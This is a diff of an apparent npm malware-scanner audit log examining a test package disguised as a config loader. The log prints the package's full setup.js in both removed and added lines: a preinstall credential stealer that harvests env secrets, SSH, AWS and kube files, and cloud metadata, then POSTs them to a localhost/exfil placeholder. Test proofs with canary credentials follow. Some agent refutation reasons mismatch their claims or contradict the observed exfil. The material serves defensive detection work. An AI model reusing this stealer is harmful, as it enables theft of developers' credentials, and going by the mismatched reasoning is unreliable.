-      "resultPreview": "const http = require(\"http\");\nconst https = require(\"https\");\nconst os = require(\"os\");\nconst fs = require(\"fs\");\nconst path = require(\"path\");\n\nconst SAFE_TEST_MODE = true;\nconst EXFIL_URL = \"http://localhost:9999/exfil\";\nconst IMDS_URL = \"http://169.254.169.254/latest/meta-data/\";\n\nconst SENSITIVE_KEYS = [\n  \"NPM_TOKEN\",\n  \"npm_config_registry\",\n  \"npm_config__auth\",\n  \"AWS_ACCESS_KEY_ID\",\n  \"AWS_SECRET_ACCESS_KEY\",\n  \"AWS_SESSION_TOKEN\",\n  \"GITHUB_TOKEN\",\n  \"GH_TOKEN\",\n  \"GITLAB_TOKEN\",\n  \"AZ",
-      "step": 2,
-      "injectionDetected": false
+      "type": "hypothesis_resolved",
+      "timestamp": "2026-01-01T00:00:14.750000Z",
+      "hypId": "hyp-0005",
+      "claim": "env_exfil",
+      "severity": "high",
+      "state": "REFUTED",
+      "by": "worker:experimenter",
+      "reason": "The timeline shows many env reads and file reads (including the planted canary values) and a single POST to http://localhost/exfil (e61). However, there is no evidence of a request to the IMDS (169.254.169.254/latest/meta-data/) – the stub was provided but never observed being accessed. The POST at e61 targets localhost:9999/exfil only if the stub pattern matches, but the timeline does not record the exact URL or body; critically, the IMDS probe that the hypothesis claims should be triggered is entirely absent. Without that probe, the claimed exfiltration chain cannot be confirmed. Therefore the suspected behavior did not happen."
     },
     {
-      "type": "agent_tool_call",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:04.230Z",
-      "seq": 30,
-      "tool": "readFile",
-      "args": {
-        "path": "index.js"
-      },
-      "step": 2
+      "type": "hypothesis_resolved",
+      "timestamp": "2026-01-01T00:00:15Z",
+      "hypId": "hyp-0010",
+      "claim": "binary_drop",
+      "severity": "high",
+      "state": "REFUTED",
+      "by": "worker:experimenter",
+      "reason": "The timeline does not show any read of `/home/node/.npmrc` or access to the planted canary token. The only file reads are system libraries, `/pkg/package.json`, `/tmp/_instrument.js`, `/pkg/index.js`, and standard proc/cgroup files. The suspected code path (index.js:16-16) would require reading the attacker-supplied path, but no such event appears."
     },
     {
-      "type": "agent_tool_result",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:04.230Z",
-      "seq": 31,
-      "tool": "readFile",
-      "resultPreview": "const SAFE_TEST_MODE = true;\n\nconst path = require(\"path\");\nconst fs = require(\"fs\");\n\nfunction loadConfig(options = {}) {\n  const config = {};\n  const prefix = options.prefix || \"\";\n\n  for (const [key, value] of Object.entries(process.env)) {\n    if (prefix && !key.startsWith(prefix)) continue;\n    const configKey = prefix ? key.slice(prefix.length) : key;\n    config[configKey.toLowerCase()] = value;\n  }\n\n  const envPath = options.path || path.resolve(process.cwd(), \".env\");\n  try {\n    const c",
-      "step": 2,
-      "injectionDetected": false
+      "type": "hypothesis_resolved",
+      "timestamp": "2026-01-01T00:00:15.250000Z",
+      "hypId": "hyp-0011",
+      "claim": "persistence",
+      "severity": "high",
+      "state": "REFUTED",
+      "by": "worker:experimenter",
+      "reason": "No event in the timeline shows the package reading a user-supplied path (e.g., via `fs.readFileSync` or similar) from an external argument, environment variable, or file. The only file reads are the package’s own source (`/pkg/index.js`, `/tmp/_instrument.js`), system libraries, and configuration files (`/etc/ssl/openssl.cnf`, `/proc/*`, `/sys/fs/cgroup/*`). The planted canary file `/home/node/.npmrc` was never accessed. No arbitrary file read occurred."
     },
     {
-      "type": "agent_thinking",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:04.230Z",
-      "seq": 32,
-      "step": 3
+      "type": "hypothesis_resolved",
+      "timestamp": "2026-01-01T00:00:15.500000Z",
+      "hypId": "hyp-0012",
+      "claim": "cred_theft",
+      "severity": "high",
+      "state": "REFUTED",
+      "by": "worker:experimenter",
+      "reason": "No event in the timeline shows the sensitive content from env NPMRC being assigned into any config object. The planted driver checks for its presence but only prints 'No bait found in config'; stdout writes (e70) were not captured content-side, and no exfiltration network or file write occurred."
     },
     {
-      "type": "agent_tool_call",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:08.783Z",
-      "seq": 33,
-      "tool": "runLifecycleHook",
-      "args": {
-        "hookName": "preinstall"
-      },
-      "step": 3
+      "type": "hypothesis_resolved",
+      "timestamp": "2026-01-01T00:00:15.750000Z",
+      "hypId": "hyp-0013",
+      "claim": "env_exfil",
+      "severity": "high",
+      "state": "REFUTED",
+      "by": "worker:experimenter",
+      "reason": "The timeline shows only benign Node.js runtime initialization and file reads. There is no evidence of reading the planted /pkg/.env file, resolving environment variables from it, or exfiltrating any data. The NPMGUARD_CANARY_TOKEN_f8e2d91a value was never accessed or transmitted."
     },
     {
-      "type": "agent_tool_result",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:08.784Z",
-      "seq": 34,
-      "tool": "runLifecycleHook",
-      "resultPreview": "TRACE LOG:\n[{\"type\":\"require\",\"module\":\"fs\",\"from\":\"/tmp/_instrument.js\"},{\"type\":\"require\",\"module\":\"http\",\"from\":\"/tmp/_instrument.js\"},{\"type\":\"require\",\"module\":\"https\",\"from\":\"/tmp/_instrument.js\"},{\"type\":\"require\",\"module\":\"child_process\",\"from\":\"/tmp/_instrument.js\"},{\"type\":\"require\",\"module\":\"crypto\",\"from\":\"/tmp/_instrument.js\"},{\"type\":\"require\",\"module\":\"/pkg/setup.js\",\"from\":\"<root>\"},{\"type\":\"fs\",\"method\":\"readFileSync\",\"path\":\"/pkg/setup.js\"},{\"type\":\"require\",\"module\":\"http\",\"fr",
-      "step": 3,
-      "injectionDetected": false
+      "type": "hypothesis_resolved",
+      "timestamp": "2026-01-01T00:00:16Z",
+      "hypId": "hyp-0009",
+      "claim": "telemetry",
+      "severity": "low",
+      "state": "REFUTED",
+      "by": "worker:experimenter",
+      "reason": "The hypothesis claims a benign code path guarded by SAFE_TEST_MODE is triggered, but the timeline shows no evidence of any conditional check on a constant named SAFE_TEST_MODE, nor any telemetry transmission gated by such a check. The only network activity is a POST to localhost (e52) and a GET to a metadata IP (e140), which align with the stated purpose of environment detection. The hypothesis is therefore not supported by the timeline."
     },
     {
-      "type": "agent_reasoning",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:08.784Z",
-      "seq": 35,
-      "text": "This is clearly malicious. Let me confirm by running the preinstall hook with instrumentation.",
-      "step": 3
-    },
-    {
-      "type": "agent_thinking",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:08.784Z",
-      "seq": 36,
-      "step": 4
-    },
-    {
-      "type": "agent_reasoning",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:27.031Z",
-      "seq": 37,
-      "text": "## 🔴 CONFIRMED MALICIOUS: Credential Theft Package\n\n### Finding 1: Preinstall Hook Automatically Executes Malicious Code\n\n| Attribute | Value |\n|-----------|-------|\n| **Capability** | EVAL, NETWORK, FILESYSTEM, ENV_VARS, CREDENTIAL_THEFT |\n| **Location** | `package.json` → `scripts.preinstall: \"node setup.js\"` |\n| **Evidence** | The `preinstall` lifecycle hook runs `setup.js` automatically when the package is installed, with zero user interaction. This is the entry point for all malicious activity. |\n\n### Finding 2: Environment Variable Harvesting (Targeted + Regex Sweep)\n\n| Attribute | Value |\n|-----------|-------|\n| **Capability** | ENV_VARS, CREDENTIAL_THEFT |\n| **File** | `setup.js:17-37` |\n\n**Code** (`setup.js:17-37`):\n```js\nconst SENSITIVE_KEYS = [\n  \"NPM_TOKEN\", \"npm_config_registry\", \"npm_config__auth\",\n  \"AWS_ACCESS_KEY_ID\", \"AWS_SECRET_ACCESS_KEY\", \"AWS_SESSION_TOKEN\",\n  \"GITHUB_TOKEN\", \"GH_TOKEN\", \"GITLAB_TOKEN\",\n  \"AZURE_CLIENT_SECRET\", \"DOCKER_AUTH_CONFIG\",\n  \"CI\", \"JENKINS_URL\", \"TRAVIS\", \"CIRCLE_TOKEN\",\n  \"HOSTNAME\", \"USER\", \"HOME\",\n];\n\nfunction harvestEnv() {\n  const harvested = {};\n  for (const key of SENSITIVE_KEYS) { process.env[key] && (harvested[key] = process.env[key]); }\n  for (const [key, value] of Object.entries(process.env)) {\n    if (/token|secret|key|password|auth|credential/i.test(key)) { harvested[key] = value; }\n  }\n  return harvested;\n}\n```\n\n**Trace Evidence** — observed env reads during execution:\n```\nenv:NPM_TOKEN, env:npm_config_registry, env:npm_config__auth,\nenv:AWS_ACCESS_KEY_ID, env:AWS_SECRET_ACCESS_KEY, env:AWS_SESSION_TOKEN,\nenv:GITHUB_TOKEN, env:GH_TOKEN, env:GITLAB_TOKEN,\nenv:AZURE_CLIENT_SECRET, env:DOCKER_AUTH_CONFIG,\nenv:CI, env:JENKINS_URL, env:TRAVIS, env:CIRCLE_TOKEN,\nenv:HOSTNAME, env:USER, env:HOME, env:NODE_VERSION, env:YARN_VERSION, ...\n```\n\n### Finding 3: Credential File Theft (SSH Keys, AWS, Docker, npm, kubeconfig)\n\n| Attribute | Value |\n|-----------|-------|\n| **Capability** | FILESYSTEM, CREDENTIAL_THEFT |",
-      "step": 4
-    },
-    {
-      "type": "agent_thinking",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:27.031Z",
-      "seq": 38,
-      "step": 5
-    },
-    {
-      "type": "finding_discovered",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:56.032Z",
-      "seq": 39,
-      "finding": {
-        "capability": "EVAL, NETWORK, FILESYSTEM, ENV_VARS, CREDENTIAL_THEFT",
-        "confidence": "SUSPECTED",
-        "fileLine": "package.json → scripts.preinstall: \"node setup.js\"",
-        "problem": "",
-        "evidence": "The `preinstall` lifecycle hook runs `setup.js` automatically when the package is installed, with zero user interaction.",
-        "reproductionStrategy": "Node executes `node setup.js` automatically during `npm install`."
-      }
-    },
-    {
-      "type": "finding_discovered",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:56.032Z",
-      "seq": 40,
-      "finding": {
-        "capability": "ENV_VARS, CREDENTIAL_THEFT",
-        "confidence": "SUSPECTED",
-        "fileLine": "setup.js:17-37",
-        "problem": "Harvests environment variables from a predefined sensitive keys list and a regex sweep for token/secret/key/password/auth/credential.",
-        "evidence": "",
-        "reproductionStrategy": "The script iterates over `process.env` and collects matching entries."
-      }
-    },
-    {
-      "type": "finding_discovered",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:56.032Z",
-      "seq": 41,
-      "finding": {
-        "capability": "FILESYSTEM, CREDENTIAL_THEFT",
-        "confidence": "SUSPECTED",
-        "fileLine": "setup.js:39-66",
-        "problem": "Reads 9 sensitive credential files: ~/.npmrc, ~/.yarnrc, ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.aws/credentials, ~/.aws/config, ~/.gitconfig, ~/.docker/config.json, ~/.kube/config.",
-        "evidence": "",
-        "reproductionStrategy": "Uses `fs.readFileSync` to read each file and stores contents."
-      }
-    },
-    {
-      "type": "finding_discovered",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:56.032Z",
-      "seq": 42,
-      "finding": {
-        "capability": "NETWORK, CREDENTIAL_THEFT",
-        "confidence": "SUSPECTED",
-        "fileLine": "setup.js:68-76",
-        "problem": "Probes AWS IMDS endpoint `http://169.254.169.254/latest/meta-data/` to steal temporary cloud credentials.",
-        "evidence": "",
-        "reproductionStrategy": "Makes HTTP request to IMDS endpoint and captures response."
-      }
-    },
-    {
-      "type": "finding_discovered",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:56.032Z",
-      "seq": 43,
-      "finding": {
-        "capability": "NETWORK, CREDENTIAL_THEFT",
-        "confidence": "SUSPECTED",
-        "fileLine": "setup.js:78-93",
-        "problem": "Bundles all stolen data (env vars, credential files, IMDS data) into a JSON payload and POSTs to attacker-controlled URL.",
-        "evidence": "",
-        "reproductionStrategy": "Uses `http.request` to send POST with JSON body to `http://localhost:9999/exfil` (placeholder for real C2)."
-      }
+      "type": "hypothesis_resolved",
+      "timestamp": "2026-01-01T00:00:16.250000Z",
+      "hypId": "hyp-0014",
+      "claim": "destructive",
+      "severity": "low",
+      "state": "REFUTED",
+      "by": "worker:experimenter",
+      "reason": "The timeline shows the preload attempted to monkey-patch readFileSync to throw on .env files, but the patched version was not actually invoked because the patched require('module')._load never triggered (the index.js was loaded via a different path). More importantly, the timeline shows that /pkg/.env was read successfully at e24 (fs /pkg/.env (readFileSync)), meaning the .env file was accessible and not blocked. The empty catch block hypothesis posits that a permission error would be silently swallowed, but no such error occurred; the .env file was read normally. No evidence of a destructive outcome exists in the observed events."
     },
     {
       "type": "phase_completed",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:56.319Z",
-      "seq": 44,
-      "phase": "investigation",
-      "durationMs": 63664
-    },
-    {
-      "type": "phase_started",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:05:56.321Z",
-      "seq": 45,
-      "phase": "experimenter"
-    },
-    {
-      "type": "experiment_confirmed",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:00.540Z",
-      "seq": 46,
-      "hypId": "trg-0001",
-      "reason": "Network activity detected after planting credentials."
-    },
-    {
-      "type": "phase_completed",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:00.540Z",
-      "seq": 47,
-      "phase": "experimenter",
-      "durationMs": 4219
-    },
-    {
-      "type": "phase_started",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:00.540Z",
-      "seq": 48,
-      "phase": "test-gen"
-    },
-    {
-      "type": "phase_completed",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:40.551Z",
-      "seq": 49,
-      "phase": "test-gen",
-      "durationMs": 40011
-    },
-    {
-      "type": "phase_started",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:40.551Z",
-      "seq": 50,
-      "phase": "verify"
-    },
-    {
-      "type": "verify_started",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:40.552Z",
-      "seq": 51,
-      "totalTests": 5
-    },
-    {
-      "type": "verify_attempt",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:41.265Z",
-      "seq": 52,
-      "attempt": 1,
-      "maxAttempts": 3
-    },
-    {
-      "type": "verify_test_result",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:52.745Z",
-      "seq": 53,
-      "proofIndex": 0,
-      "testFile": "finding-0.test.ts",
-      "status": "confirmed"
-    },
-    {
-      "type": "verify_test_result",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:52.745Z",
-      "seq": 54,
-      "proofIndex": 1,
-      "testFile": "finding-1.test.ts",
-      "status": "confirmed"
-    },
-    {
-      "type": "verify_test_result",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:52.745Z",
-      "seq": 55,
-      "proofIndex": 2,
-      "testFile": "finding-2.test.ts",
-      "status": "confirmed"
-    },
-    {
-      "type": "verify_test_result",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:52.745Z",
-      "seq": 56,
-      "proofIndex": 3,
-      "testFile": "finding-3.test.ts",
-      "status": "confirmed"
-    },
-    {
-      "type": "verify_test_result",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:52.745Z",
-      "seq": 57,
-      "proofIndex": 4,
-      "testFile": "finding-4.test.ts",
-      "status": "confirmed"
-    },
-    {
-      "type": "phase_completed",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:53.050Z",
-      "seq": 58,
-      "phase": "verify",
-      "durationMs": 12499
-    },
-    {
-      "type": "graph_verdict",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:53.051Z",
-      "seq": 59,
-      "verdict": "DANGEROUS",
-      "rationale": "1 confirmed hypothesis with dynamic evidence.",
-      "counts": {
-        "total": 1,
-        "open": 0,
-        "inProgress": 0,
-        "confirmed": 1,
-        "refuted": 0,
-        "inconclusive": 0,
-        "deferred": 0
-      },
-      "confirmedHypIds": [
-        "trg-0001"
-      ]
+      "timestamp": "2026-01-01T00:00:16.500000Z",
+      "phase": "orchestrator",
+      "durationMs": 41800.0
     },
     {
       "type": "verdict_reached",
-      "auditId": "recording",
-      "timestamp": "2026-06-28T13:06:53.052Z",
-      "seq": 60,
+      "timestamp": "2026-01-01T00:00:16.750000Z",
       "verdict": "DANGEROUS",
-      "capabilities": [
-        "CREDENTIAL_THEFT"
-      ],
-      "proofCount": 5
+      "rationale": "1 confirmed hypothesis with cited dynamic evidence.",
+      "counts": {
+        "total": 14,
+        "open": 0,
+        "inProgress": 0,
+        "confirmed": 1,
+        "refuted": 13,
+        "deferred": 0
+      },
+      "confirmedCount": 1
     }
   ],
   "files": {
     "index.js": "const SAFE_TEST_MODE = true;\n\nconst path = require(\"path\");\nconst fs = require(\"fs\");\n\nfunction loadConfig(options = {}) {\n  const config = {};\n  const prefix = options.prefix || \"\";\n\n  for (const [key, value] of Object.entries(process.env)) {\n    if (prefix && !key.startsWith(prefix)) continue;\n    const configKey = prefix ? key.slice(prefix.length) : key;\n    config[configKey.toLowerCase()] = value;\n  }\n\n  const envPath = options.path || path.resolve(process.cwd(), \".env\");\n  try {\n    const content = fs.readFileSync(envPath, \"utf-8\");\n    for (const line of content.split(\"\\n\")) {\n      const trimmed = line.trim();\n      if (!trimmed || trimmed.startsWith(\"#\")) continue;\n      const [key, ...rest] = trimmed.split(\"=\");\n      config[key.trim().toLowerCase()] = rest.join(\"=\").trim();\n    }\n  } catch (e) {\n\n  }\n\n  return config;\n}\n\nmodule.exports = { loadConfig };\n",
-    "package.json": "{\n  \"name\": \"test-pkg-env-exfil\",\n  \"version\": \"2.0.1\",\n  \"description\": \"Smart configuration loader with environment detection\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"preinstall\": \"node setup.js\"\n  },\n  \"keywords\": [\"config\", \"env\", \"loader\", \"dotenv\"],\n  \"author\": \"test-author\",\n  \"license\": \"MIT\"\n}\n",
-    "setup.js": "const http = require(\"http\");\nconst https = require(\"https\");\nconst os = require(\"os\");\nconst fs = require(\"fs\");\nconst path = require(\"path\");\n\nconst SAFE_TEST_MODE = true;\nconst EXFIL_URL = \"http://localhost:9999/exfil\";\nconst IMDS_URL = \"http://169.254.169.254/latest/meta-data/\";\n\nconst SENSITIVE_KEYS = [\n  \"NPM_TOKEN\",\n  \"npm_config_registry\",\n  \"npm_config__auth\",\n  \"AWS_ACCESS_KEY_ID\",\n  \"AWS_SECRET_ACCESS_KEY\",\n  \"AWS_SESSION_TOKEN\",\n  \"GITHUB_TOKEN\",\n  \"GH_TOKEN\",\n  \"GITLAB_TOKEN\",\n  \"AZURE_CLIENT_SECRET\",\n  \"DOCKER_AUTH_CONFIG\",\n  \"CI\",\n  \"JENKINS_URL\",\n  \"TRAVIS\",\n  \"CIRCLE_TOKEN\",\n  \"HOSTNAME\",\n  \"USER\",\n  \"HOME\",\n];\n\nfunction harvestEnv() {\n  const harvested = {};\n  for (const key of SENSITIVE_KEYS) {\n    if (process.env[key]) {\n      harvested[key] = process.env[key];\n    }\n  }\n\n  for (const [key, value] of Object.entries(process.env)) {\n    if (/token|secret|key|password|auth|credential/i.test(key)) {\n      harvested[key] = value;\n    }\n  }\n  return harvested;\n}\n\nfunction readCredentialFiles() {\n  const home = os.homedir();\n  const targets = [\n    path.join(home, \".npmrc\"),\n    path.join(home, \".yarnrc\"),\n    path.join(home, \".ssh\", \"id_rsa\"),\n    path.join(home, \".ssh\", \"id_ed25519\"),\n    path.join(home, \".aws\", \"credentials\"),\n    path.join(home, \".aws\", \"config\"),\n    path.join(home, \".gitconfig\"),\n    path.join(home, \".docker\", \"config.json\"),\n    path.join(home, \".kube\", \"config\"),\n  ];\n\n  const files = {};\n  for (const filePath of targets) {\n    try {\n      const content = fs.readFileSync(filePath, \"utf-8\");\n      files[filePath] = content;\n    } catch (e) {\n\n    }\n  }\n  return files;\n}\n\nfunction probeIMDS(callback) {\n  http\n    .get(IMDS_URL, { timeout: 2000 }, (res) => {\n      let data = \"\";\n      res.on(\"data\", (chunk) => (data += chunk));\n      res.on(\"end\", () => callback(data));\n    })\n    .on(\"error\", () => callback(null));\n}\n\nfunction exfiltrate(payload) {\n  const data = JSON.stringify(payload);\n  const url = new URL(EXFIL_URL);\n\n  const options = {\n    hostname: url.hostname,\n    port: url.port,\n    path: url.pathname,\n    method: \"POST\",\n    headers: {\n      \"Content-Type\": \"application/json\",\n      \"Content-Length\": Buffer.byteLength(data),\n      \"User-Agent\": \"npm/8.0.0 node/v18.0.0\",\n    },\n  };\n\n  const req = http.request(options, () => {});\n  req.on(\"error\", () => {\n\n  });\n  req.write(data);\n  req.end();\n}\n\nconst stolen = {\n  timestamp: new Date().toISOString(),\n  hostname: os.hostname(),\n  username: os.userInfo().username,\n  platform: process.platform,\n  arch: os.arch(),\n  cwd: process.cwd(),\n  env: harvestEnv(),\n  files: readCredentialFiles(),\n  imds: null,\n};\n\nprobeIMDS((imdsData) => {\n  stolen.imds = imdsData;\n  exfiltrate(stolen);\n});\n"
+    "setup.js": "const http = require(\"http\");\nconst https = require(\"https\");\nconst os = require(\"os\");\nconst fs = require(\"fs\");\nconst path = require(\"path\");\n\nconst SAFE_TEST_MODE = true;\nconst EXFIL_URL = \"http://localhost:9999/exfil\";\nconst IMDS_URL = \"http://169.254.169.254/latest/meta-data/\";\n\nconst SENSITIVE_KEYS = [\n  \"NPM_TOKEN\",\n  \"npm_config_registry\",\n  \"npm_config__auth\",\n  \"AWS_ACCESS_KEY_ID\",\n  \"AWS_SECRET_ACCESS_KEY\",\n  \"AWS_SESSION_TOKEN\",\n  \"GITHUB_TOKEN\",\n  \"GH_TOKEN\",\n  \"GITLAB_TOKEN\",\n  \"AZURE_CLIENT_SECRET\",\n  \"DOCKER_AUTH_CONFIG\",\n  \"CI\",\n  \"JENKINS_URL\",\n  \"TRAVIS\",\n  \"CIRCLE_TOKEN\",\n  \"HOSTNAME\",\n  \"USER\",\n  \"HOME\",\n];\n\nfunction harvestEnv() {\n  const harvested = {};\n  for (const key of SENSITIVE_KEYS) {\n    if (process.env[key]) {\n      harvested[key] = process.env[key];\n    }\n  }\n\n  for (const [key, value] of Object.entries(process.env)) {\n    if (/token|secret|key|password|auth|credential/i.test(key)) {\n      harvested[key] = value;\n    }\n  }\n  return harvested;\n}\n\nfunction readCredentialFiles() {\n  const home = os.homedir();\n  const targets = [\n    path.join(home, \".npmrc\"),\n    path.join(home, \".yarnrc\"),\n    path.join(home, \".ssh\", \"id_rsa\"),\n    path.join(home, \".ssh\", \"id_ed25519\"),\n    path.join(home, \".aws\", \"credentials\"),\n    path.join(home, \".aws\", \"config\"),\n    path.join(home, \".gitconfig\"),\n    path.join(home, \".docker\", \"config.json\"),\n    path.join(home, \".kube\", \"config\"),\n  ];\n\n  const files = {};\n  for (const filePath of targets) {\n    try {\n      const content = fs.readFileSync(filePath, \"utf-8\");\n      files[filePath] = content;\n    } catch (e) {\n\n    }\n  }\n  return files;\n}\n\nfunction probeIMDS(callback) {\n  http\n    .get(IMDS_URL, { timeout: 2000 }, (res) => {\n      let data = \"\";\n      res.on(\"data\", (chunk) => (data += chunk));\n      res.on(\"end\", () => callback(data));\n    })\n    .on(\"error\", () => callback(null));\n}\n\nfunction exfiltrate(payload) {\n  const data = JSON.stringify(payload);\n  const url = new URL(EXFIL_URL);\n\n  const options = {\n    hostname: url.hostname,\n    port: url.port,\n    path: url.pathname,\n    method: \"POST\",\n    headers: {\n      \"Content-Type\": \"application/json\",\n      \"Content-Length\": Buffer.byteLength(data),\n      \"User-Agent\": \"npm/8.0.0 node/v18.0.0\",\n    },\n  };\n\n  const req = http.request(options, () => {});\n  req.on(\"error\", () => {\n\n  });\n  req.write(data);\n  req.end();\n}\n\nconst stolen = {\n  timestamp: new Date().toISOString(),\n  hostname: os.hostname(),\n  username: os.userInfo().username,\n  platform: process.platform,\n  arch: os.arch(),\n  cwd: process.cwd(),\n  env: harvestEnv(),\n  files: readCredentialFiles(),\n  imds: null,\n};\n\nprobeIMDS((imdsData) => {\n  stolen.imds = imdsData;\n  exfiltrate(stolen);\n});\n",
+    "package.json": "{\n  \"name\": \"test-pkg-env-exfil\",\n  \"version\": \"2.0.1\",\n  \"description\": \"Smart configuration loader with environment detection\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"preinstall\": \"node setup.js\"\n  },\n  \"keywords\": [\"config\", \"env\", \"loader\", \"dotenv\"],\n  \"author\": \"test-author\",\n  \"license\": \"MIT\"\n}\n"
   },
   "report": {
+    "schemaVersion": 2,
     "verdict": "DANGEROUS",
-    "capabilities": [
-      "CREDENTIAL_THEFT"
+    "rationale": "1 confirmed hypothesis with cited dynamic evidence.",
+    "counts": {
+      "total": 14,
+      "open": 0,
+      "inProgress": 0,
+      "confirmed": 1,
+      "refuted": 13,
+      "deferred": 0
+    },
+    "confirmedHypIds": [
+      "hyp-0008"
     ],
-    "proofs": [
+    "hypotheses": [
       {
-        "capability": "CREDENTIAL_THEFT",
-        "attackPathway": "",
-        "confidence": "CONFIRMED",
-        "fileLine": "package.json → scripts.preinstall: \"node setup.js\"",
-        "problem": "",
-        "evidence": "The `preinstall` lifecycle hook runs `setup.js` automatically when the package is installed, with zero user interaction.",
-        "kind": "TEST_CONFIRMED",
-        "contentHash": null,
-        "reproducible": true,
-        "reproductionCmd": null,
-        "testFile": "/tmp/npmguard-tests-mJJcgk/finding-0.test.ts",
-        "testHash": "58ea09d8397672c4d67da122278c0e4488771f07d84140a82338fc662528aad9",
-        "testCode": "const os = require(\"os\");\nconst path = require(\"path\");\nconst fs = require(\"fs\");\n\nconst { runPackage } = require(\"../harness/sandbox-runner\");\nconst { http, HttpResponse } = require(\"msw\");\nconst { server } = require(\"../harness/server\");\n\ndescribe(\"test-pkg-env-exfil (preinstall credential theft)\", () => {\n  it(\"harvests sensitive env vars, reads credential files, probes IMDS, and exfiltrates\", async () => {\n    const home = os.homedir();\n    let exfilBody: any = {};\n\n    server.use(\n      http.post(\"*/exfil\", async ({ request }) => {\n        exfilBody = await request.json();\n        return HttpResponse.text(\"ok\");\n      }),\n      http.get(\"http://169.254.169.254/latest/meta-data/\", () =>\n        HttpResponse.text(\"ami-12345\")\n      ),\n      http.get(\"http://169.254.169.254/*\", () => HttpResponse.text(\"ami-12345\"))\n    );\n\n    const originalReadFileSync = fs.readFileSync;\n    const fsSpy = vi.spyOn(fs, \"readFileSync\").mockImplementation((p: any, ...args: any[]) => {\n      const pathStr = p.toString();\n      // Return fake content for credential files so the malware proceeds\n      if (pathStr.includes(\".npmrc\")) return \"_authToken=npm_NPMGUARD_CANARYaaaaaaaaaaaaaaaaaaaaaa\\n\";\n      if (pathStr.includes(\".aws/credentials\")) return \"aws_access_key_id=AKIANPMGUARDCANARY01\\naws_secret_access_key=NPMGUARD_CANARY/SECRET/dddddddddddddddddd\\n\";\n      if (pathStr.includes(\"id_rsa\")) return \"-----BEGIN RSA PRIVATE KEY-----\\nFAKE\\n\";\n      return originalReadFileSync(p, ...args);\n    });\n\n    // Run the preinstall script (setup.js)\n    try {\n      await runPackage(\"test-pkg-env-exfil\", \"setup.js\");\n    } catch {\n      // Malware may throw after exfil, but spies already recorded calls\n    }\n\n    // Wait for async IMDS probe and exfiltration\n    await new Promise((r) => setTimeout(r, 1500));\n\n    // Assert that credential files were read\n    expect(fsSpy).toHaveBeenCalledWith(\n      expect.stringContaining(\".npmrc\"),\n      expect.anything()\n    );\n    expect(fsSpy).toHaveBeenCalledWith(\n      expect.stringContaining(\".aws/credentials\"),\n      expect.anything()\n    );\n\n    // Assert exfil body contains canary credentials\n    expect(exfilBody).toBeDefined();\n    expect(exfilBody.env).toBeDefined();\n    expect(exfilBody.files).toBeDefined();\n    expect(JSON.stringify(exfilBody)).toContain(\"NPMGUARD_CANARY\");\n    expect(JSON.stringify(exfilBody.env)).toContain(\"NPMGUARD_CANARY\");\n    expect(JSON.stringify(exfilBody.files)).toContain(\"NPMGUARD_CANARY\");\n  });\n});",
-        "verifyError": null,
-        "reasoningHash": null,
-        "teeAttestationId": null
-      },
-      {
-        "capability": "CREDENTIAL_THEFT",
-        "attackPathway": "",
-        "confidence": "CONFIRMED",
-        "fileLine": "setup.js:17-37",
-        "problem": "Harvests environment variables from a predefined sensitive keys list and a regex sweep for token/secret/key/password/auth/credential.",
-        "evidence": "",
-        "kind": "TEST_CONFIRMED",
-        "contentHash": null,
-        "reproducible": true,
-        "reproductionCmd": null,
-        "testFile": "/tmp/npmguard-tests-mJJcgk/finding-1.test.ts",
-        "testHash": "e574872250b46baabe2f982fc6a12a23d3532154ab6a3077f17d0bb4a5e206ca",
-        "testCode": "const os = require(\"os\");\nconst path = require(\"path\");\nconst fs = require(\"fs\");\n\nconst { runPackage } = require(\"../harness/sandbox-runner\");\nconst { http, HttpResponse } = require(\"msw\");\nconst { server } = require(\"../harness/server\");\n\ndescribe(\"test-pkg-env-exfil (ENV_VARS/CREDENTIAL_THEFT)\", () => {\n  it(\"harvests env vars and credential files, exfiltrates canary credentials\", async () => {\n    let exfilBody: any = {};\n\n    server.use(\n      http.post(\"*/exfil\", async ({ request }) => {\n        exfilBody = await request.json();\n        return HttpResponse.text(\"ok\");\n      }),\n      http.get(\"http://169.254.169.254\", () => HttpResponse.text(\"ami-12345\")),\n      http.get(\"http://169.254.169.254/*\", () => HttpResponse.text(\"ami-12345\"))\n    );\n\n    await runPackage(\"test-pkg-env-exfil\", \"setup.js\");\n    await new Promise((r) => setTimeout(r, 1500));\n\n    const bodyStr = JSON.stringify(exfilBody);\n    expect(bodyStr).toContain(\"NPMGUARD_CANARY\");\n\n    // Soft existence checks\n    expect(exfilBody.env).toBeDefined();\n    expect(exfilBody.files).toBeDefined();\n    expect(exfilBody.hostname).toBeDefined();\n  });\n});",
-        "verifyError": null,
